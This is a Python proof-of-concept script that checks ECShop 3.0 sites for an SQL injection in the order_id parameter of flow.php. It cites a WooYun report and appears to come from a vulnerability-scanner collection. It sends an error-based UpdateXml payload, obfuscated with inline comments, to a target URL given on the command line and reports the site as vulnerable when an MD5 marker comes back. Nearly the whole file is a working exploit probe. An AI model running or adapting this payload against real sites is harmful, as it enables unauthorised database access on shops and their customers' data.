#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ecshop3.0 flow.php 参数order_id注入
referer: http://www.wooyun.org/bugs/wooyun-2016-0212882
author: Lucifer
description: 文件flow.php中,参数order_id存在SQL注入。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class ecshop_flow_orderid_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/flow.php?step=repurchase"
        post_data = {
            "order_id":"1/**/Or/**/UpdateXml(1,ConCat(0x7e,(Md5(1234))),0)/**/Or/**/11#"
        }
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在ecshop3.0 flow.php 参数order_id注入漏洞...(高危)\tpayload: "+vulnurl+ "\npost: "+json.dumps(post_data, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = ecshop_flow_orderid_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
